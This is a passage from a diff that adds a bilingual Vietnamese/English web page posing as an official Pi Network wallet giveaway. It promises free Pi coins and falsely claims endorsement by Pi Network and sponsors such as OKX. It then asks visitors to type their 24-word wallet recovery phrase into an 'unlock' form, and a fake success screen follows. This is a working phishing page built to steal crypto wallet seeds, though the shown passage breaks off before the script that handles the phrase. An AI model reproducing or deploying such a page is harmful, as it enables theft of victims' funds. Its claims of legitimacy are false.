+        <h3 data-vi="Truy Cập Bị Từ Chối" data-en="Access Denied">Truy Cập Bị Từ Chối</h3>
+        <p data-vi="Địa chỉ IP của bạn đã bị chặn do có nhiều yêu cầu đáng ngờ. Vui lòng liên hệ bộ phận hỗ trợ nếu bạn tin rằng đây là lỗi." 
+           data-en="Your IP address has been blocked due to suspicious activity. Please contact support if you believe this is an error.">
+            Địa chỉ IP của bạn đã bị chặn do có nhiều yêu cầu đáng ngờ. Vui lòng liên hệ bộ phận hỗ trợ nếu bạn tin rằng đây là lỗi.
+        </p>
+        <button id="closeBlockedMessage" data-vi="Đóng" data-en="Close">Đóng</button>
+    </div>
+
+    <!-- Location Detection Notification -->
+    <div id="locationDetectedMessage" class="location-detected">
+        <img id="countryFlag" src="" alt="Country Flag" class="country-flag">
+        <span id="locationText"></span>
+    </div>
+
+    <!-- Pi Wallet Header -->
+    <header class="pi-header">
+        <div class="pi-header-content">
+            <button class="header-back-btn" id="headerBackBtn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M15 18l-6-6 6-6"></path>
+                </svg>
+            </button>
+            
+            <div class="flex items-center">
+                <div class="wallet-icon">π</div>
+                <span class="wallet-text">Wallet</span>
+                <div class="pi-coin-icon">π</div>
+            </div>
+            
+            <div class="language-chooser">
+                <div class="language-option" data-lang="vi">
+                    <img src="https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/vn.svg" alt="Vietnamese">
+                    VN
+                </div>
+                <div class="language-option" data-lang="en">
+                    <img src="https://cdn.jsdelivr.net/npm/flag-icon-css@3.5.0/flags/4x3/us.svg" alt="English">
+                    EN
+                </div>
+            </div>
+            
+            <button class="header-dropdown-btn" id="headerDropdownBtn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M6 9l6 6 6-6"></path>
+                </svg>
+            </button>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <div class="page-container">
+        <!-- Home Page -->
+        <div id="homePage" class="page page-active">
+            <div class="container mx-auto px-4 py-8">
+                <!-- Hero Section -->
+                <section class="text-center mb-16 relative">
+                    <i class="fas fa-star floating-icon" style="top: 10%; right: 10%; opacity: 0.3;"></i>
+                    <i class="fas fa-coins floating-icon" style="bottom: 20%; left: 5%; opacity: 0.3;"></i>
+                    
+                    <h2 class="text-4xl font-bold mb-6 inline-block relative animate-on-scroll" data-vi="Nhận Thưởng Pi Network" data-en="Receive Pi Network Rewards">
+                        Nhận Thưởng Pi Network
+                        <span class="absolute -top-3 -right-6 text-xs font-bold bg-gradient-to-r from-yellow-400 to-yellow-600 text-white px-2 py-1 rounded-full transform rotate-12" data-vi="Mới" data-en="New">Mới</span>
+                    </h2>
+                    <p class="text-lg mb-8 max-w-2xl mx-auto animate-on-scroll" data-delay="200" 
+                       data-vi="Tham gia chương trình khuyến mãi đặc biệt và nhận Pi miễn phí! Ưu đãi có thời hạn dành cho cộng đồng Pi Network." 
+                       data-en="Join the special promotion and receive free Pi! Limited time offer for the Pi Network community.">
+                        Tham gia chương trình khuyến mãi đặc biệt và nhận Pi miễn phí! Ưu đãi có thời hạn dành cho cộng đồng Pi Network.
+                    </p>
+                    <button id="openFormBtn" class="btn-primary text-lg animate-on-scroll" data-delay="400" 
+                            data-vi="Nhận Thưởng 314 Pi Ngay" data-en="Get 314 Pi Now">
+                        Nhận Thưởng 314 Pi Ngay
+                    </button>
+                    
+                    <!-- Features with enhanced wave effect -->
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-12">
+                        <div class="card p-5 feature-card">
+                            <div class="feature-card-wave"></div>
+                            <div class="feature-icon">
+                                <i class="fas fa-check-circle"></i>
+                            </div>
+                            <p class="font-medium mt-4" data-vi="Chương Trình Xác Thực" data-en="Verified Program">Chương Trình Xác Thực</p>
+                        </div>
+                        <div class="card p-5 feature-card">
+                            <div class="feature-card-wave"></div>
+                            <div class="feature-icon">
+                                <i class="fas fa-clock"></i>
+                            </div>
+                            <p class="font-medium mt-4" data-vi="Nhận Trong 24h" data-en="Receive in 24h">Nhận Trong 24h</p>
+                        </div>
+                        <div class="card p-5 feature-card">
+                            <div class="feature-card-wave"></div>
+                            <div class="feature-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <p class="font-medium mt-4" data-vi="An Toàn & Bảo Mật" data-en="Safe & Secure">An Toàn & Bảo Mật</p>
+                        </div>
+                        <div class="card p-5 feature-card">
+                            <div class="feature-card-wave"></div>
+                            <div class="feature-icon">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <p class="font-medium mt-4" data-vi="500000+ Người Tham Gia" data-en="500000+ Participants">500000+ Người Tham Gia</p>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- Rewards Section - Simplified -->
+                <section class="mb-16">
+                    <h3 class="text-3xl font-bold mb-8 text-center relative inline-block animate-on-scroll" 
+                        data-vi="Phần Thưởng Khả Dụng" data-en="Available Rewards">
+                        Phần Thưởng Khả Dụng
+                        <div class="absolute bottom-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 to-purple-800"></div>
+                    </h3>
+                    <div class="grid md:grid-cols-3 gap-8">
+                        <div class="card reward-card p-8 animate-on-scroll" data-delay="200">
+                            <div class="absolute top-3 right-3 text-xs font-bold bg-gradient-to-r from-purple-500 to-purple-800 text-white px-2 py-1 rounded-full" data-vi="Hot" data-en="Hot">Hot</div>
+                            <h4 class="text-xl font-bold mb-2" data-vi="Thưởng Người Dùng Mới" data-en="New User Reward">Thưởng Người Dùng Mới</h4>
+                            <p class="text-sm text-gray-500 dark:text-gray-400 mb-3" data-vi="Người dùng mới" data-en="New users">Người dùng mới</p>
+                            <p class="reward-amount mb-4">50</p>
+                            <div class="progress-bar mb-2">
+                                <div class="progress-fill" style="width: 1.9%"></div>
+                            </div>
+                            <p class="text-sm text-right" data-vi="Còn lại: 1842/100000" data-en="Remaining: 1842/100000">Còn lại: 1842/100000</p>
+                        </div>
+                        
+                        <div class="card reward-card p-8 animate-on-scroll" data-delay="400">
+                            <h4 class="text-xl font-bold mb-2" data-vi="Phần Thưởng Tiên Phong" data-en="Pioneer Reward">Phần Thưởng Tiên Phong</h4>
+                            <p class="text-sm text-gray-500 dark:text-gray-400 mb-3" data-vi="Có thời hạn" data-en="Limited time">Có thời hạn</p>
+                            <p class="reward-amount mb-4">314</p>
+                            <div class="progress-bar mb-2">
+                                <div class="progress-fill" style="width: 68.6%"></div>
+                            </div>
+                            <p class="text-sm text-right" data-vi="Còn lại: 34013/50000" data-en="Remaining: 34013/50000">Còn lại: 34013/50000</p>
+                        </div>
+                        
+                        <div class="card reward-card p-8 animate-on-scroll" data-delay="600">
+                            <h4 class="text-xl font-bold mb-2" data-vi="Thưởng Cộng Đồng" data-en="Community Reward">Thưởng Cộng Đồng</h4>
+                            <p class="text-sm text-gray-500 dark:text-gray-400 mb-3" data-vi="Thưởng giới thiệu trên 100+" data-en="Over 100+ referral rewards">Thưởng giới thiệu trên 100+</p>
+                            <p class="reward-amount mb-4">100</p>
+                            <div class="progress-bar mb-2">
+                                <div class="progress-fill" style="width: 22.75%"></div>
+                            </div>
+                            <p class="text-sm text-right" data-vi="Còn lại: 2295/20000" data-en="Remaining: 2295/20000">Còn lại: 2295/20000</p>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- About Section with Simplified Illustration -->
+                <section class="mb-16 animate-on-scroll">
+                    <div class="card p-8 max-w-4xl mx-auto">
+                        <h3 class="text-3xl font-bold mb-8 text-center" data-vi="Về Chương Trình Này" data-en="About This Program">Về Chương Trình Này</h3>
+                        
+                        <!-- Simplified About Illustration -->
+                        <div class="about-illustration">
+                            <div class="about-circle">
+                                <i class="fas fa-coins about-icon"></i>
+                            </div>
+                        </div>
+                        
+                        <p class="mb-8 text-lg text-center" 
+                           data-vi="Chương trình thưởng này là sáng kiến do Picoreteam và nhà tài trợ thực hiện để hỗ trợ những người tiên phong Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi chỉ phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực."
+                           data-en="This reward program is an initiative by Picoreteam and sponsors to support Pi Network pioneers. As an independent promotion, we distribute a limited amount of Pi coins to active community members.">
+                            Chương trình thưởng này là sáng kiến do Picoreteam và nhà tài trợ thực hiện để hỗ trợ những người tiên phong Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi chỉ phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực.
+                        </p>
+                        
+                        <h4 class="text-2xl font-bold mb-6 text-center" data-vi="Cách Thức Hoạt Động" data-en="How It Works">Cách Thức Hoạt Động</h4>
+                        <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mb-8">
+                            <div class="text-center">
+                                <div class="text-2xl font-bold text-purple-600 mb-2">1</div>
+                                <p data-vi="Nhấn vào nút &quot;Nhận Pi 314 Pi Miễn Phí Ngay&quot; phía trên" 
+                                   data-en="Click the &quot;Get 314 Pi Now&quot; button above">
+                                    Nhấn vào nút "Nhận Pi 314 Pi Miễn Phí Ngay" phía trên
+                                </p>
+                            </div>
+                            <div class="text-center">
+                                <div class="text-2xl font-bold text-purple-600 mb-2">2</div>
+                                <p data-vi="Nhập cụm 24 từ để đăng nhập và claim Pi thưởng" 
+                                   data-en="Enter your 24-word phrase to unlock and claim Pi rewards">
+                                    Nhập cụm 24 từ để đăng nhập và claim Pi thưởng
+                                </p>
+                            </div>
+                            <div class="text-center">
+                                <div class="text-2xl font-bold text-purple-600 mb-2">3</div>
+                                <p data-vi="Gửi yêu cầu của bạn để xác minh" 
+                                   data-en="Submit your request for verification">
+                                    Gửi yêu cầu của bạn để xác minh
+                                </p>
+                            </div>
+                            <div class="text-center">
+                                <div class="text-2xl font-bold text-purple-600 mb-2">4</div>
+                                <p data-vi="Nhận phần thưởng Pi trong vòng 24 giờ" 
+                                   data-en="Receive Pi rewards within 24 hours">
+                                    Nhận phần thưởng Pi trong vòng 24 giờ
+                                </p>
+                            </div>
+                        </div>
+                        
+                        <div class="certificate">
+                            <div class="certificate-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <p class="certificate-title" data-vi="Bảo Mật & Minh Bạch" data-en="Security & Transparency">Bảo Mật & Minh Bạch</p>
+                            <p class="certificate-text" 
+                               data-vi="Đây là chiến dịch khuyến mãi độc lập được liên kết và xác nhận bởi Pi Network chính thức." 
+                               data-en="This is an independent promotional campaign affiliated and verified by the official Pi Network.">
+                                Đây là chiến dịch khuyến mãi độc lập được liên kết và xác nhận bởi Pi Network chính thức.
+                            </p>
+                        </div>
+                    </div>
+                </section>
+                
+                <!-- Sponsors Section - Simplified -->
+                <section class="mb-16">
+                    <h4 class="text-2xl font-bold mb-8 text-center animate-on-scroll" 
+                        data-vi="Được Hỗ Trợ Bởi" data-en="Supported By">
+                        Được Hỗ Trợ Bởi
+                    </h4>
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
+                        <div class="card p-4">
+                            <div class="text-center text-purple-600 text-3xl mb-2">
+                                <i class="fas fa-chart-line"></i>
+                            </div>
+                            <p class="font-bold text-center">TechFi</p>
+                            <p class="text-sm text-center text-gray-500" 
+                               data-vi="Hỗ trợ kỹ thuật" data-en="Technical support">
+                                Hỗ trợ kỹ thuật
+                            </p>
+                        </div>
+                        <div class="card p-4">
+                            <div class="text-center text-purple-600 text-3xl mb-2">
+                                <i class="fas fa-cubes"></i>
+                            </div>
+                            <p class="font-bold text-center">OKX</p>
+                            <p class="text-sm text-center text-gray-500" 
+                               data-vi="Đối tác blockchain" data-en="Blockchain partner">
+                                Đối tác blockchain
+                            </p>
+                        </div>
+                        <div class="card p-4">
+                            <div class="text-center text-purple-600 text-3xl mb-2">
+                                <i class="fas fa-credit-card"></i>
+                            </div>
+                            <p class="font-bold text-center">CryptoPlus</p>
+                            <p class="text-sm text-center text-gray-500" 
+                               data-vi="Cổng thanh toán" data-en="Payment gateway">
+                                Cổng thanh toán
+                            </p>
+                        </div>
+                        <div class="card p-4">
+                            <div class="text-center text-purple-600 text-3xl mb-2">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <p class="font-bold text-center">PiCommunity</p>
+                            <p class="text-sm text-center text-gray-500" 
+                               data-vi="Hỗ trợ cộng đồng" data-en="Community support">
+                                Hỗ trợ cộng đồng
+                            </p>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            
+            <!-- Footer -->
+            <footer class="py-10 px-4 relative">
+                <div class="absolute inset-0 opacity-10 bg-purple-900"></div>
+                <div class="relative z-10 container mx-auto text-center">
+                    <div class="mb-6">
+                        <div class="w-16 h-16 mx-auto bg-gradient-to-r from-purple-600 to-purple-800 rounded-full flex items-center justify-center text-white text-2xl font-bold shadow-lg">π</div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+                        <div>
+                            <h5 class="font-bold mb-3" data-vi="Liên Hệ" data-en="Contact">Liên Hệ</h5>
+                            <p class="flex items-center justify-center mb-2">
+                                <i class="fas fa-envelope mr-2 text-purple-400"></i>
+                                support@minepi.com
+                            </p>
+                            <p class="flex items-center justify-center">
+                                <i class="fas fa-globe mr-2 text-purple-400"></i>
+                                GETPIFREE
+                            </p>
+                        </div>
+                        <div>
+                            <h5 class="font-bold mb-3" data-vi="Chính Sách" data-en="Policies">Chính Sách</h5>
+                            <p class="mb-2" data-vi="Bảo mật dữ liệu" data-en="Data privacy">Bảo mật dữ liệu</p>
+                            <p data-vi="Điều khoản sử dụng" data-en="Terms of use">Điều khoản sử dụng</p>
+                        </div>
+                        <div>
+                            <h5 class="font-bold mb-3" data-vi="Theo Dõi" data-en="Follow Us">Theo Dõi</h5>
+                            <div class="flex justify-center space-x-4">
+                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
+                                    <i class="fab fa-telegram text-purple-400"></i>
+                                </span>
+                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
+                                    <i class="fab fa-twitter text-purple-400"></i>
+                                </span>
+                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
+                                    <i class="fab fa-discord text-purple-400"></i>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="mb-4 max-w-2xl mx-auto" 
+                       data-vi="Đây là chương trình khuyến mãi độc lập và xác nhận bởi Pi Network chính thức." 
+                       data-en="This is an independent promotional program verified by the official Pi Network.">
+                        Đây là chương trình khuyến mãi độc lập và xác nhận bởi Pi Network chính thức.
+                    </p>
+                    <p class="text-sm text-gray-500 dark:text-gray-400" 
+                       data-vi="© 2025 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền." 
+                       data-en="© 2025 Pi Network Reward Program. All rights reserved.">
+                        © 2025 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền.
+                    </p>
+                </div>
+            </footer>
+        </div>
+        
+        <!-- Pi Wallet Form Page -->
+        <div id="formPage" class="page page-inactive-right">
+            <div class="container mx-auto px-4 py-8">
+                <div class="pi-wallet-style surprise-container">
+                    <div class="pi-title animate-on-scroll" data-vi="Mở khóa ví Pi" data-en="Unlock Pi Wallet">Mở khóa ví Pi</div>
+                    
+                    <!-- Limit message container -->
+                    <div id="limitMessage" class="limit-message">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        <span data-vi="Bạn đã gửi yêu cầu 1/2 lần. Mỗi thiết bị chỉ được phép gửi tối đa 2 yêu cầu." 
+                              data-en="You have submitted 1/2 requests. Each device is limited to a maximum of 2 requests.">
+                            Bạn đã gửi yêu cầu 1/2 lần. Mỗi thiết bị chỉ được phép gửi tối đa 2 yêu cầu.
+                        </span>
+                    </div>
+
+                    <!-- Error message for exceeding limit -->
+                    <div id="errorMessage" class="error-message">
+                        <i class="fas fa-ban mr-2"></i>
+                        <span data-vi="Bạn đã vượt quá số lần gửi yêu cầu cho phép (2 lần). Vui lòng liên hệ bộ phận hỗ trợ nếu cần trợ giúp." 
+                              data-en="You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.">
+                            Bạn đã vượt quá số lần gửi yêu cầu cho phép (2 lần). Vui lòng liên hệ bộ phận hỗ trợ nếu cần trợ giúp.
+                        </span>
+                    </div>
+                    
+                    <div class="animate-on-scroll" data-delay="200">
+                        <div class="pi-input-container">
+                            <textarea id="walletAddress" class="pi-input" 
+                                      data-vi="Nhập cụm mật khẩu 24 từ của bạn tại đây" 
+                                      data-en="Enter your 24-word recovery phrase here"
+                                      placeholder="Nhập cụm mật khẩu 24 từ của bạn tại đây"></textarea>
+                        </div>
+                        <div id="wordCounter" class="word-counter"></div>
+                        <div id="validationMessage" class="validation-message hidden" 
+                             data-vi="Vui lòng nhập đúng 24 từ khôi phục ví" 
+                             data-en="Please enter exactly 24 recovery words">
+                            Vui lòng nhập đúng 24 từ khôi phục ví
+                        </div>
+                    </div>
+                    
+                    <div class="animate-on-scroll" data-delay="400">
+                        <button id="unlockSubmitBtn" class="pi-button pi-button-primary surprise-trigger" 
+                                data-vi="MỞ KHÓA VỚI CỤM MẬT KHẨU" 
+                                data-en="UNLOCK WITH RECOVERY PHRASE">
+                            MỞ KHÓA VỚI CỤM MẬT KHẨU
+                        </button>
+                        
+                        <button class="pi-button pi-button-secondary" 
+                                data-vi="MỞ KHÓA BẰNG VÂN TAY" 
+                                data-en="UNLOCK WITH FINGERPRINT">
+                            MỞ KHÓA BẰNG VÂN TAY
+                        </button>
+                    </div>
+                    
+                    <div class="pi-info-text">
+                        <p data-vi="Là một ví không giám sát, cụm mật khẩu của bạn chỉ có bạn mới có thể truy cập. Hiện tại không thể khôi phục cụm mật khẩu" 
+                           data-en="As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery phrases cannot be recovered if lost.">
+                            Là một ví không giám sát, cụm mật khẩu của bạn chỉ có bạn mới có thể truy cập. Hiện tại không thể khôi phục cụm mật khẩu
+                        </p>
+                        <p class="mt-2">
+                            <span data-vi="Bạn bị mất cụm mật khẩu ví?" data-en="Lost your wallet recovery phrase?">Bạn bị mất cụm mật khẩu ví?</span> 
+                            <a href="#" class="pi-link" 
+                               data-vi="Bạn có thể tạo một ví mới" 
+                               data-en="You can create a new wallet">Bạn có thể tạo một ví mới</a>, 
+                            <span data-vi="nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập." 
+                                  data-en="but all π in your previous wallet will be inaccessible.">nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập.</span>
+                        </p>
+                    </div>
+                    
+                    <!-- Hidden explosion particles for surprise effect - kept but simplified -->
+                    <div id="explosionContainer"></div>
+                </div>
+                
+                <div class="mt-8 text-center">
+                    <button id="backToHomeBtn" class="btn-secondary">
+                        <i class="fas fa-arrow-left mr-2"></i> 
+                        <span data-vi="Quay Lại Trang Chủ" data-en="Back to Home">Quay Lại Trang Chủ</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal (initially hidden) -->
+    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+        <div class="card max-w-md w-full mx-4 p-8">
+            <div class="text-center mb-8">
+                <div class="w-16 h-16 mx-auto bg-green-500 rounded-full flex items-center justify-center text-white text-2xl mb-4">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h3 class="text-3xl font-bold mb-3" 
+                    data-vi="Yêu Cầu Nhận Pi Thành Công!" 
+                    data-en="Pi Reward Request Successful!">
+                    Yêu Cầu Nhận Pi Thành Công!
+                </h3>
+                <p class="text-gray-500 dark:text-gray-400" 
+                   data-vi="Phần thưởng Pi của bạn đã được xếp hàng để xử lý. Nó sẽ được gửi đến ví của bạn trong vòng 24 giờ." 
+                   data-en="Your Pi reward has been queued for processing. It will be sent to your wallet within 24 hours.">
+                    Phần thưởng Pi của bạn đã được xếp hàng để xử lý. Nó sẽ được gửi đến ví của bạn trong vòng 24 giờ.
+                </p>
+            </div>
+            
+            <div class="space-y-6 mb-8">
+                <div class="flex justify-between items-center">
+                    <span class="font-bold" data-vi="Ví nhận:" data-en="Receiving wallet:">Ví nhận:</span>
+                    <span id="successWalletAddress" class="truncate max-w-[200px]">...</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span class="font-bold" data-vi="Số Lượng Thưởng:" data-en="Reward Amount:">Số Lượng Thưởng:</span>
+                    <span class="text-purple-600 font-bold">100 Pi</span>
+                </div>
+                <div class="flex justify-between items-center">
+                    <span class="font-bold" data-vi="Thời Gian Dự Kiến:" data-en="Estimated Time:">Thời Gian Dự Kiến:</span>
+                    <span data-vi="Trong vòng 24 giờ" data-en="Within 24 hours">Trong vòng 24 giờ</span>
+                </div>
+            </div>
+            
+            <button id="closeSuccessBtn" class="w-full btn-primary py-4" 
+                    data-vi="Quay Lại Trang Chủ" data-en="Return to Home">
+                Quay Lại Trang Chủ
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // Create premium background effects - enhanced but optimized
+        function createPremiumBackground() {
+            // Create stars (moderate number)
+            const starsContainer = document.getElementById('starsContainer');
+            const numStars = 15; 
+            
+            for (let i = 0; i < numStars; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                star.style.width = `${Math.random() * 3 + 1}px`;
+                star.style.height = star.style.width;
+                star.style.left = `${Math.random() * 100}%`;
+                star.style.top = `${Math.random() * 100}%`;
+                star.style.animationDelay = `${Math.random() * 4}s`;
+                starsContainer.appendChild(star);
+            }
+
+            // Create single-point bright stars
+            const singleStarsContainer = document.getElementById('singleStarsContainer');
+            const numSingleStars = 4; // A few bright stars
+            
+            for (let i = 0; i < numSingleStars; i++) {
+                const star = document.createElement('div');
+                star.className = 'star-single';
+                star.style.left = `${Math.random() * 90 + 5}%`;
+                star.style.top = `${Math.random() * 90 + 5}%`;
+                star.style.animationDelay = `${Math.random() * 3}s`;
+                singleStarsContainer.appendChild(star);
+            }
+
+            // Create shooting stars with proper direction
+            const shootingStarsContainer = document.getElementById('shootingStarsContainer');
+            const numShootingStars = 3;
+            
+            for (let i = 0; i < numShootingStars; i++) {
+                const shootingStar = document.createElement('div');
+                shootingStar.className = 'shooting-star';
+                
+                // Position at top-left of screen
+                shootingStar.style.left = `${Math.random() * 30}%`;
+                shootingStar.style.top = `${Math.random() * 30}%`;
+                
+                // Set length and angle for proper direction
+                const length = 80 + Math.random() * 120;
+                shootingStar.style.width = `${length}px`;
+                shootingStar.style.height = `2px`;
+                shootingStar.style.transform = 'rotate(45deg)';
+                
+                // Stagger animation timing
+                shootingStar.style.animationDelay = `${i * 3 + Math.random() * 3}s`;
+                
+                shootingStarsContainer.appendChild(shootingStar);
+            }
+            
+            // Create particles (reduced number)
+            const particlesContainer = document.getElementById('particlesContainer');
+            const numParticles = 10;
+            
+            for (let i = 0; i < numParticles; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = `${Math.random() * 6 + 2}px`;
+                particle.style.height = particle.style.width;
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                particle.style.animationDelay = `${Math.random() * 10}s`;
+                particle.style.animationDuration = `${15 + Math.random() * 10}s`;
+                particlesContainer.appendChild(particle);
+            }
+            
+            // Create Pi coins (8)
+            const coinsContainer = document.getElementById('coinsContainer');
+            const numCoins = 8;
+            
+            // Define positions that spread evenly across the screen
+            const coinPositions = [
+                {left: "15%", top: "15%"},
+                {left: "85%", top: "15%"},
+                {left: "15%", top: "85%"},
+                {left: "85%", top: "85%"},
+                {left: "50%", top: "25%"},
+                {left: "25%", top: "50%"},
+                {left: "75%", top: "50%"},
+                {left: "50%", top: "75%"}
+            ];
+            
+            for (let i = 0; i < numCoins; i++) {
+                const coin = document.createElement('div');
+                coin.className = 'premium-coin';
+                
+                const coinInner = document.createElement('div');
+                coinInner.className = 'coin-inner';
+                
+                const coinFront = document.createElement('div');
+                coinFront.className = 'coin-front';
+                coinFront.textContent = 'π';
+                
+                const coinBack = document.createElement('div');
+                coinBack.className = 'coin-back';
+                coinBack.textContent = 'π';
+                
+                coinInner.appendChild(coinFront);
+                coinInner.appendChild(coinBack);
+                coin.appendChild(coinInner);
+                
+                const size = 25 + Math.random() * 15;
+                coin.style.width = `${size}px`;
+                coin.style.height = `${size}px`;
+                coin.style.left = coinPositions[i].left;
+                coin.style.top = coinPositions[i].top;
+                coin.style.animationDelay = `${Math.random() * 3}s`;
+                coin.style.opacity = "0.3";
+                
+                // Simpler floating animation
+                coin.style.animation = `float 10s infinite ease-in-out`;
+                
+                coinsContainer.appendChild(coin);
+            }
+            
+            // Create light streaks (2)
+            const lightStreaksContainer = document.getElementById('lightStreaksContainer');
+            const numStreaks = 2;
+            
+            for (let i = 0; i < numStreaks; i++) {
+                const streak = document.createElement('div');
+                streak.className = 'light-streak';
+                streak.style.top = `${30 + i * 40}%`;
+                streak.style.animationDelay = `${i * 5}s`;
+                lightStreaksContainer.appendChild(streak);
+            }
+        }
+        
+        // Create confetti for the success animation
+        function createConfetti() {
+            const container = document.getElementById('confettiContainer');
+            container.innerHTML = ''; // Clear any existing confetti
+            
+            const colors = [
+                '#693988', // Pi purple
+                '#f8c056', // Pi gold
+                '#ffffff', // White
+                '#9c55d4', // Light purple
+                '#ffd78c'  // Light gold
+            ];
+            
+            const numConfetti = 150;
+            
+            for (let i = 0; i < numConfetti; i++) {
+                const confetti = document.createElement('div');
+                
+                // Randomly select confetti type
+                const type = Math.floor(Math.random() * 3);
+                if (type === 0) {
+                    confetti.className = 'confetti confetti-square';
+                } else if (type === 1) {
+                    confetti.className = 'confetti confetti-circle';
+                } else {
+                    confetti.className = 'confetti confetti-triangle';
+                }
+                
+                // Random position, color, size and animation timing
+                confetti.style.left = `${Math.random() * 100}%`;
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                
+                const size = 5 + Math.random() * 10;
+                confetti.style.width = `${size}px`;
+                confetti.style.height = `${size}px`;
+                
+                // Animation 
+                const duration = 2 + Math.random() * 3;
+                const delay = Math.random() * 0.5;
+                confetti.style.animation = `confettiFall ${duration}s ease-in ${delay}s forwards`;
+                
+                container.appendChild(confetti);
+            }
+        }
+        
+        // Show confetti celebration
+        function showConfetti() {
+            createConfetti();
+            const container = document.getElementById('confettiContainer');
+            container.style.display = 'block';
+            
+            // Hide after animation completes
+            setTimeout(() => {
+                container.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Add wave animations to feature cards
+        function setupFeatureCardWaves() {
+            // Apply staggered animation delays to waves
+            const waves = document.querySelectorAll('.feature-card-wave');
+            waves.forEach((wave, index) => {
+                wave.style.animationDelay = `${index * 1}s`;
+            });
+            
+            // Add staggered delays for icon shine effects
+            const icons = document.querySelectorAll('.feature-icon');
+            icons.forEach((icon, index) => {
+                const afterElem = window.getComputedStyle(icon, '::after');
+                icon.style.setProperty('--delay', `${index * 2}s`);
+            });
+        }
+        
+        // Create explosion particles - simplified
+        function createExplosionParticles() {
+            const container = document.getElementById('explosionContainer');
+            const numParticles = 20;
+            
+            for (let i = 0; i < numParticles; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'explosion-particle';
+                
+                // Set random direction for each particle
+                const angle = Math.random() * Math.PI * 2;
+                const distance = 100 + Math.random() * 100;
+                const tx = Math.cos(angle) * distance;
+                const ty = Math.sin(angle) * distance;
+                
+                particle.style.setProperty('--tx', `${tx}px`);
+                particle.style.setProperty('--ty', `${ty}px`);
+                
+                container.appendChild(particle);
+            }
+        }
+        
+        // Show loading spinner
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
+        }
+        
+        // Hide loading spinner
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+        
+        // Show success modal with confetti
+        function showSuccessModal(walletAddress) {
+            const modal = document.getElementById('successModal');
+            document.getElementById('successWalletAddress').textContent = walletAddress;
+            modal.classList.remove('hidden');
+            showConfetti(); // Show confetti celebration
+        }
+        
+        // Hide success modal
+        function hideSuccessModal() {
+            const modal = document.getElementById('successModal');
+            modal.classList.add('hidden');
+        }
+        
+        // Navigate between pages
+        function navigateTo(fromPage, toPage, direction = 'right') {
+            const from = document.getElementById(fromPage);
+            const to = document.getElementById(toPage);
+            
+            // Set initial positions
+            from.classList.remove('page-active');
+            to.classList.remove('page-inactive-left', 'page-inactive-right');
+            
+            if (direction === 'right') {
+                from.classList.add('page-inactive-left');
+                to.classList.add('page-active');
+            } else {
+                from.classList.add('page-inactive-right');
+                to.classList.add('page-active');
+            }
+            
+            // Update back button visibility
+            const headerBackBtn = document.getElementById('headerBackBtn');
+            if (toPage === 'homePage') {
+                headerBackBtn.style.visibility = 'hidden';
+            } else {
+                headerBackBtn.style.visibility = 'visible';
+            }
+            
+            // Scroll to top of new page
+            window.scrollTo(0, 0);
+        }
+        
+        // Handle scroll animations - improved performance
+        function handleScrollAnimations() {
+            const elements = document.querySelectorAll('.animate-on-scroll, .animate-fade-in');
+            
+            // Use IntersectionObserver for better performance
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const delay = entry.target.getAttribute('data-delay') || 0;
+                        setTimeout(() => {
+                            entry.target.classList.add('animated');
+                        }, delay);
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, { threshold: 0.1, rootMargin: '50px' }); // Added rootMargin for earlier animation trigger
+            
+            elements.forEach(element => {
+                observer.observe(element);
+            });
+        }
+        
+        // Submission tracking functions
+        function getSubmissionCount() {
+            try {
